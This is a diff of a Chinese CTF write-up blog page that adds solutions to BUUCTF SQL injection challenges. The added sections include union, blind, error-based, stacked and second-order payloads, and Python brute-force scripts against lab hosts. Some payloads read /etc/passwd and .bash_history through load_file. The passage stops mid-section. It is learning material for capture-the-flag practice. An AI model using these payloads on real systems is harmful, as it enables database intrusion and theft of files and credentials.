@@ -493,21 +493,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2022-05-28
+                    2022-07-24
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.5k
+                    8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    18 分
+                    35 分
                 </div>
                 
 
@@ -998,6 +998,414 @@ hex()			返回16进制数
 <p>flag_1s_her3</p>
 <p>||(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666c61675f31735f68657233)),§1§,1))=§0§)%23</p>
 <p>flag{sql1_1s_s0_ea3y}</p>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a href="#CISCN2019-华北赛区-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 华北赛区 Day2 Web1]Hack World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><p>sql注入，先用fuzz测一下过滤（buu的网站好像有访问限制，所以post到后面之后因为请求太多了会直接报429，而且不知道是不是bp的问题有些没有过滤的也会被显示为被过滤了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724095707401.png" alt="image-20210724095707401"></p>
+<p>这里应该要采用bool盲注的方式，但是过滤的东西有点多</p>
+<p>因为空格被过滤了所以要利用（）来代替空格</p>
+<p>抄了个脚本</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724131620633.png" alt="image-20210724131620633"></p>
+<p>感觉是很简单的盲注，然后要利用python编脚本</p>
+<h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107167452">GXYCTF2019]BabySQli——“绕过md5比较”_WHOAMIAnony的博客-CSDN博客</a></p>
+<p>当用户名为admin时，提示密码错误，因此能知道用户名为admin</p>
+<p>登录后跳转到search.php中，在源码里存在一个进行base加密的提示</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724153525231.png" alt="image-20210724153525231"></p>
+<p>sql注入，先fuzz看一下过滤</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724152502898.png" alt="image-20210724152502898"></p>
+<p>然后可以利用大写绕过查到共有3列（其实直接union试也可以</p>
+<p>之后要利用联合注入</p>
+<p><strong>在联合查询并不存在的数据时，联合查询就会构造一个虚拟的数据。</strong></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724152803276.png" alt="image-20210724152803276"></p>
+<p>后端代码</p>
+<pre class="language-none"><code class="language-none">&lt;?php$row;
+$pass&#x3D;$_POST[&#39;pw&#39;];
+if($row[&#39;username&#39;]&#x3D;&#x3D;’admin’)&#123;
+if($row[&#39;password&#39;]&#x3D;&#x3D;md5($pass))&#123; 
+echo $flag; 
+&#125;else&#123; echo “wrong pass!”; 
+&#125;&#125;
+else&#123; echo “wrong user!”;&#125;</code></pre>
+
+<p>所以可以在联合查询时构造虚拟的数据利用这个数据进行登录操作</p>
+<pre class="language-none"><code class="language-none">username&#x3D;0&#39; union select 1,&#39;admin&#39;,&#39;202cb962ac59075b964b07152d234b70&#39; #
+password&#x3D;123</code></pre>
+
+<p>得到flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210724153406008.png" alt="image-20210724153406008"></p>
+<h2 id="GYCTF2020-Blacklist"><a href="#GYCTF2020-Blacklist" class="headerlink" title="[GYCTF2020]Blacklist"></a>[GYCTF2020]Blacklist</h2><p>这个看起来和强网杯那个有点像</p>
+<p>同样也是堆叠注入</p>
+<p>可以用</p>
+<p>1&#39;;show tables;#查表</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725230626425.png" alt="image-20210725230626425"></p>
+<p>flag应该就在flaghere这个表里</p>
+<p>看一下列名</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725231110024.png" alt="image-20210725231110024"></p>
+<p>想查看的时候发现存在过滤</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725231208544.png" alt="image-20210725231208544"></p>
+<p>这里可以利用headler</p>
+<p>HANDLER … OPEN语句打开一个表，使其可以使用后续HANDLER … READ语句访问，该表对象未被其他会话共享，并且在会话调用HANDLER … CLOSE或会话终止之前不会关闭</p>
+<p>最终payload：1&#39;;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p>
+<p>（试了一下利用headler强网杯的那道也能注出来</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210725231720309.png" alt="image-20210725231720309"></p>
+<p><strong>关于handler命令</strong><br>转载自:<a target="_blank" rel="noopener" href="https://blog.csdn.net/jesseyoung/article/details/40785137">https://blog.csdn.net/jesseyoung/article/details/40785137</a></p>
+<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。</p>
+<p>基本语法：</p>
+<pre class="language-none"><code class="language-none">HANDLER tbl_name OPEN [ [AS] alias]
+
+HANDLER tbl_name READ index_name &#123; &#x3D; | &lt;&#x3D; | &gt;&#x3D; | &lt; | &gt; &#125; (value1,value2,...)
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ index_name &#123; FIRST | NEXT | PREV | LAST &#125;
+    [ WHERE where_condition ] [LIMIT ... ]
+HANDLER tbl_name READ &#123; FIRST | NEXT &#125;
+    [ WHERE where_condition ] [LIMIT ... ]
+
+HANDLER tbl_name CLOSE</code></pre>
+
+<p>通过HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tbl_name的句柄。<br>通过HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>通过HANDLER tbl_name CLOSE来关闭打开的句柄。</p>
+<p>通过索引去查看的话可以按照一定的顺序，获取表中的数据。<br>通过HANDLER tbl_name READ index_name FIRST，获取句柄第一行（索引最小的一行），NEXT获取下一行，PREV获取前一行，LAST获取最后一行（索引最大的一行）。</p>
+<p>通过索引列指定一个值，可以指定从哪一行开始。<br>通过HANDLER tbl_name READ index_name = value，指定从哪一行开始，通过NEXT继续浏览。</p>
+<p>如果我们不想浏览一个表的所有行，可以使用where和limit子句。</p>
+<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>盲注，注入点在id</p>
+<p>可以利用异或来进行盲注</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210906123555686.png" alt="image-20210906123555686"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210906123751187.png" alt="image-20210906123751187"></p>
+<p>找个脚本直接爆破，学一下这个脚本</p>
+<pre class="language-python" data-language="python"><code class="language-python">import requests
+import sys
+import time
+
+def get_DBlen(url):
+    for i in range(1,10):
+        db_url &#x3D; url+&quot;1^1^(length(database())&#x3D;%d)#&quot;%i
+        r &#x3D; requests.get(db_url)
+        if &quot;Click&quot; in r.text:
+            print(&quot;数据库名称的长度为:%d&quot;%i)
+            return i
+
+def get_DBname(url,length):
+    DBname &#x3D; &quot;&quot;
+    length &#x3D; length + 1
+    for i in range(1,length):
+        Max &#x3D; 122
+        Min &#x3D; 41
+        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2
+        while Min &lt;&#x3D; Max:
+            # 爆表名
+            db_url &#x3D; url+&quot;1^1^(ascii(substr(database(),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)
+            r &#x3D; requests.get(db_url)
+            if &quot;Click&quot; in r.text:
+                Min&#x3D;Mid+1
+                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2
+                pass
+            else:
+                Max &#x3D; Mid-1
+                Mid &#x3D; (Min+Max)&#x2F;&#x2F;2
+                pass
+            pass
+        DBname &#x3D; DBname + chr(Mid)
+    print(DBname)
+    return DBname
+
+def get_TBname(url):
+    name&#x3D;&quot;&quot;
+    i &#x3D; 0
+    while True:
+        i &#x3D; i+1
+        Max &#x3D; 128
+        Min &#x3D; 32
+        Mid &#x3D; (Max+Min)&#x2F;&#x2F;2
+        while Min &lt;&#x3D; Max:
+            # 爆表名
+            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)
+            # 爆字段名
+            # db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name&#x3D;&#39;F1naI1y&#39;)),%d,1))&gt;&#x3D;%d)#&quot;%(i,Mid)
+            # 获取flag
+            db_url &#x3D; url+&quot;1^1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;&#x3D;%d)&quot;%(i,Mid)
+            r &#x3D; requests.get(db_url)
+            if &quot;Click&quot; in r.text:
+                Min&#x3D;Mid+1
+                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2
+                pass
+            else:
+                Max&#x3D;Mid-1
+                Mid&#x3D;(Min+Max)&#x2F;&#x2F;2
+                pass
+            pass
+        name&#x3D;name+chr(Mid)
+        print(name)
+        if Mid &#x3D;&#x3D; 31:
+            break
+        time.sleep(0.5)
+  if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+    url &#x3D; &quot;http:&#x2F;&#x2F;0b2df33c-3f5b-4b49-ae98-ca2c2c2e55bf.node4.buuoj.cn:81&#x2F;search.php?id&#x3D;&quot;
+    db_Len &#x3D; get_DBlen(url)
+    db_Name &#x3D; get_DBname(url,db_Len)
+    tb_name &#x3D; get_TBname(url)
+
+</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20210906151816679.png" alt="image-20210906151816679"></p>
+<h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>第一次遇见二次注入的题，正好学一下</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211026234512946.png" alt="image-20211026234512946"></p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211026234523294.png" alt="image-20211026234523294"></p>
+<p>源码里有个file，猜测有文件包含，可以利用伪协议读取这几个页面的源码</p>
+<p>change.php页面</p>
+<pre class="language-sql" data-language="sql"><code class="language-sql">&lt;?php
+
+require_once &quot;config.php&quot;;
+
+if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))
+&#123;
+    $msg &#x3D; &#39;&#39;;
+    $pattern &#x3D; &#39;&#x2F;select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile&#x2F;i&#39;;
+    $user_name &#x3D; $_POST[&quot;user_name&quot;];
+    $address &#x3D; addslashes($_POST[&quot;address&quot;]);
+    $phone &#x3D; $_POST[&quot;phone&quot;];
+    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;
+        $msg &#x3D; &#39;no sql inject!&#39;;
+    &#125;else&#123;
+        $sql &#x3D; &quot;select * from &#96;user&#96; where &#96;user_name&#96;&#x3D;&#39;&#123;$user_name&#125;&#39; and &#96;phone&#96;&#x3D;&#39;&#123;$phone&#125;&#39;&quot;;
+        $fetch &#x3D; $db-&gt;query($sql);
+    &#125;
+
+    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;
+        $row &#x3D; $fetch-&gt;fetch_assoc();
+        $sql &#x3D; &quot;update &#96;user&#96; set &#96;address&#96;&#x3D;&#39;&quot;.$address.&quot;&#39;, &#96;old_address&#96;&#x3D;&#39;&quot;.$row[&#39;address&#39;].&quot;&#39; where &#96;user_id&#96;&#x3D;&quot;.$row[&#39;user_id&#39;];
+        $result &#x3D; $db-&gt;query($sql);
+        if(!$result) &#123;
+            echo &#39;error&#39;;
+            print_r($db-&gt;error);
+            exit;
+        &#125;
+        $msg &#x3D; &quot;订单修改成功&quot;;
+    &#125; else &#123;
+        $msg &#x3D; &quot;未找到订单!&quot;;
+    &#125;
+&#125;else &#123;
+    $msg &#x3D; &quot;信息不全&quot;;
+&#125;</code></pre>
+
+<p>主要的漏洞点就在change.php</p>
+<p>因为其他输入位置过滤的太多，基本能注入的都被过滤了，所以只能利用address</p>
+<p>在创建address时虽然对输入的数据进行了addslashes过滤</p>
+<p>但之后还会对旧address进行一次sql查询</p>
+<p>因此可以利用二次注入，再结合报错注入，和load_file函数读取flag文件</p>
+<p>在创建时在地址中输入注入语句</p>
+<p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),1,20)),0x7e),1)#</p>
+<p>1&#39; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#39;/flag.txt&#39;),21,50)),0x7e),1)#</p>
+<p>（这里之所以要看flag.txt根据师傅们的博客推测是纯靠猜的</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211027000523555.png" alt="image-20211027000523555"></p>
+<p>在修改地址的时候就会重新调用这个sql语句，报错输出flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211027000543438.png" alt="image-20211027000543438"></p>
+<h2 id="RCTF2015-EasySQL"><a href="#RCTF2015-EasySQL" class="headerlink" title="[RCTF2015]EasySQL"></a>[RCTF2015]EasySQL</h2><p>这也是个二次注入</p>
+<p>注册后登录再修改密码</p>
+<p>利用报错注入</p>
+<p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))),1))#</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028162141941.png" alt="image-20211028162141941"></p>
+<p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;))),1))#</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028162259138.png" alt="image-20211028162259138"></p>
+<p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(flag))from(flag))),1))#</p>
+<p>离谱，被骗了</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028163357632.png" alt="image-20211028163357632"></p>
+<p>重新查表</p>
+<p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;))),1))#</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028170524356.png" alt="image-20211028170524356"></p>
+<p>这一看就是没输出全</p>
+<p>ethe&quot;||(updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users))),1))#</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028170804487.png" alt="image-20211028170804487"></p>
+<p>？？？</p>
+<p>这个字段里加了一堆没用的数据</p>
+<p>只能用正则regexp过滤一下</p>
+<p>ethe&quot;||updatexml(1,concat(0x3a,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))),1)#</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028171620967.png" alt="image-20211028171620967"></p>
+<p>还是没输出全</p>
+<p>之后就要用逆序输出了</p>
+<pre class="language-txt" data-language="txt"><code class="language-txt">ethe&quot;||updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1)#</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211028171750860.png" alt="image-20211028171750860"></p>
+<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>有git泄露，用githack跑一遍，然后利用git log --reflog查看历史提交，再利用git reset回滚版本，得到原始的代码</p>
+<pre class="language-php" data-language="php"><code class="language-php">&lt;?php
+include &quot;mysql.php&quot;;
+session_start();
+if($_SESSION[&#39;login&#39;] !&#x3D; &#39;yes&#39;)&#123;
+    header(&quot;Location: .&#x2F;login.php&quot;);
+    die();
+&#125;
+if(isset($_GET[&#39;do&#39;]))&#123;
+switch ($_GET[&#39;do&#39;])
+&#123;
+case &#39;write&#39;:
+    $category &#x3D; addslashes($_POST[&#39;category&#39;]);
+    $title &#x3D; addslashes($_POST[&#39;title&#39;]);
+    $content &#x3D; addslashes($_POST[&#39;content&#39;]);
+    $sql &#x3D; &quot;insert into board
+            set category &#x3D; &#39;$category&#39;,
+                title &#x3D; &#39;$title&#39;,
+                content &#x3D; &#39;$content&#39;&quot;;
+    $result &#x3D; mysql_query($sql);
+    header(&quot;Location: .&#x2F;index.php&quot;);
+    break;
+case &#39;comment&#39;:
+    $bo_id &#x3D; addslashes($_POST[&#39;bo_id&#39;]);
+    $sql &#x3D; &quot;select category from board where id&#x3D;&#39;$bo_id&#39;&quot;;
+    $result &#x3D; mysql_query($sql);
+    $num &#x3D; mysql_num_rows($result);
+    if($num&gt;0)&#123;
+    $category &#x3D; mysql_fetch_array($result)[&#39;category&#39;];
+    $content &#x3D; addslashes($_POST[&#39;content&#39;]);
+    $sql &#x3D; &quot;insert into comment
+            set category &#x3D; &#39;$category&#39;,
+                content &#x3D; &#39;$content&#39;,
+                bo_id &#x3D; &#39;$bo_id&#39;&quot;;
+    $result &#x3D; mysql_query($sql);
+    &#125;
+    header(&quot;Location: .&#x2F;comment.php?id&#x3D;$bo_id&quot;);
+    break;
+default:
+    header(&quot;Location: .&#x2F;index.php&quot;);
+&#125;
+&#125;
+else&#123;
+    header(&quot;Location: .&#x2F;index.php&quot;);
+&#125;
+?&gt;</code></pre>
+
+<p>输入的内容都被addslashes过滤了，但是在comment部分，category是直接从数据库中调出来的，也就是说这里存在二次注入</p>
+<p>在发帖部分：的category里输入x&#39;,content=database(),/*</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117213616672.png" alt="image-20211117213616672"></p>
+<p>再在提交留言里</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117213710038.png" alt="image-20211117213710038"></p>
+<p>这样可以形成多行注释，注释掉原有的content字段</p>
+<p>可以得到数据库名称</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117213738173.png" alt="image-20211117213738173"></p>
+<p>这时查询语句为</p>
+<pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment
+        set category &#x3D; &#39;x&#39;,content&#x3D;database(),&#x2F;*&#39;,
+            content &#x3D; &#39;*&#x2F;#&#39;,
+            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre>
+
+<p>即</p>
+<pre class="language-none"><code class="language-none">$sql &#x3D; &quot;insert into comment
+        set category &#x3D; &#39;x&#39;,content&#x3D;database(),
+            bo_id &#x3D; &#39;$bo_id&#39;&quot;;</code></pre>
+
+<p><strong>SQL读取文件</strong><br>用load_file()函数进行读取，值得注意的是读取文件并返回文件内容为字符串。要使用此函数，文件必须位于服务器主机上，必须指定完整路径的文件，而且必须有FILE权限。 该文件所有字节可读，但文件内容必须小于max_allowed_packet。如果该文件不存在或无法读取，因为前面的条件之一不满足，函数返回 NULL。</p>
+<p><strong>.bash_history</strong></p>
+<p>在unix/linux系统下保存历史命令的文件，在用户的根目录下，即<code>~/</code>处。</p>
+<p><strong>.DS_Store文件泄露</strong></p>
+<p>文件泄露，有一个下载至本地的<a target="_blank" rel="noopener" href="https://github.com/lijiejie/ds_store_exp">脚本</a>，不过这题用不上。</p>
+<p>在发帖之前还有个登录界面，用户名和密码前几位直接给了，剩下三位爆破得到666</p>
+<p>&#39;,content=(select(load_file(&quot;/etc/passwd&quot;))),/*</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214221610.png" alt="image-20211117214221610"></p>
+<p>这一步应该是为了知道.bash_histroy文件的路径</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214325543.png" alt="image-20211117214325543"></p>
+<p> &#39;,content=(select(load_file(&quot;/home/www/.bash_history&quot;))),/*</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214355622.png" alt="image-20211117214355622"></p>
+<p>我们看到进行了一个解压然后复制和删除的操作，而.DS_Store只在/var/www/html/目录下被删除了，/tmp/html目录下依然存在</p>
+<p>接着再查.DS_Store</p>
+<p> &#39;,content=(select hex(load_file(&quot;/tmp/html/.DS_Store&quot;))),/*</p>
+<p>为了使其全部显示，要用hex编码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214600582.png" alt="image-20211117214600582"></p>
+<p>然后解码</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214639450.png" alt="image-20211117214639450"></p>
+<p>看见有个flag文件</p>
+<p>读一下</p>
+<p>&#39;,content=(select hex(load_file(&quot;/var/www/html/flag_8946e1ff1ee3e40f.php&quot;))),/*</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214713821.png" alt="image-20211117214713821"></p>
+<p>再解码，拿到flag</p>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211117214747130.png" alt="image-20211117214747130"></p>
+<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>or被过滤了，没法用information查表了，但是可以用</p>
+<pre class="language-none"><code class="language-none">1&amp;&amp;ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),1,1))&#x3D;103
+2||ascii(substr((select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema&#x3D;database()),&#123;&#125;,1))&#x3D;&#123;&#125;.format()</code></pre>
+
+<p>正确的时候返回Nu1L，错误时返回V&amp;N</p>
+<p>爆表脚本</p>
+<pre class="language-none"><code class="language-none">import requests
+
+url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;&quot;
+
+payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;
+
+database&#x3D; &#39;&#39;
+
+for i in range(1,1000):
+	low &#x3D; 32
+	heigh &#x3D; 128
+	mid &#x3D; (low + heigh) &#x2F;&#x2F; 2
+	while (low &lt; heigh):
+		payload1 &#x3D; payload.format(i,mid)
+		post_data &#x3D; &#123;&#39;id&#39;: payload1&#125;
+		r &#x3D; requests.post(url,data&#x3D;post_data)
+		print(payload1)
+		if &quot;Nu1L&quot; in r.text:
+			low &#x3D; mid + 1
+		else:
+			heigh &#x3D; mid
+		mid &#x3D; (low + heigh) &#x2F;&#x2F; 2
+	if mid &#x3D;&#x3D; 32:
+		break
+	database +&#x3D;chr(mid)
+	print(database)</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211123202113511.png" alt="image-20211123202113511"></p>
+<p>得到表名后，拿不到列名，这里可以用无列名注入</p>
+<p>先贴payload</p>
+<p>2||((select 1,&quot;{}&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))</p>
+<p>采用了字符偏移</p>
+<ul>
+<li><p>按位去比较，如果爆破字符与flag的第一个字符相等，就向后继续，大了小了都要继续当前的循环，直到找到合适的字符</p>
+</li>
+<li><p>所以最后的mid要减一才是正确的字符</p>
+</li>
+<li><p>这里我们传入十六进制，mysql会自动将十六进制转为字符</p>
+</li>
+<li><p>mysql不区分大小写，比较的时候O(0x4f)的ascii比f(0x66)的ascii小，但是比较的结果是O比f大 </p>
+</li>
+</ul>
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211123202924585.png" alt="image-20211123202924585"></p>
+<p>这里要和flag的表的列数一样</p>
+<p>最后跑一下拿flag</p>
+<pre class="language-none"><code class="language-none">import requests
+
+url &#x3D; &quot;http:&#x2F;&#x2F;c581ac4d-17cf-437c-abc6-b0153526b868.node4.buuoj.cn:81&#x2F;index.php&quot;
+
+#payload &#x3D; &#39;2||ascii(substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema&#x3D;database()),&#123;&#125;,1))&gt;&#123;&#125;&#39;
+payload &#x3D; &#39;2||((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#39;
+change &#x3D; &#39;&#39;
+database&#x3D; &#39;&#39;
+for j in range(1,100):
+	for i in range(32,128):
+		change &#x3D; database+chr(i)
+		payload1 &#x3D; payload.format(change)
+		print(payload1)
+		data &#x3D; &#123;&#39;id&#39;: payload1&#125;	
+		r &#x3D; requests.post(url,data&#x3D;data)
+		if &#39;Nu1L&#39; in r.text:
+			database +&#x3D; chr(i-1)
+			print(database)
+			break
+</code></pre>
+
+<p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C)/image-20211123205558046.png" alt="image-20211123205558046"></p>
+<h2 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h2><p>进入题目之后点击网页的几个按钮连个跳转都没有，遇事不决抓个包看看</p>
+<p>看到有个search参数，这里存在sql注入</p>
+<p>先用order by探一下列数，然后直接联合注入</p>
+<p>注表名：</p>
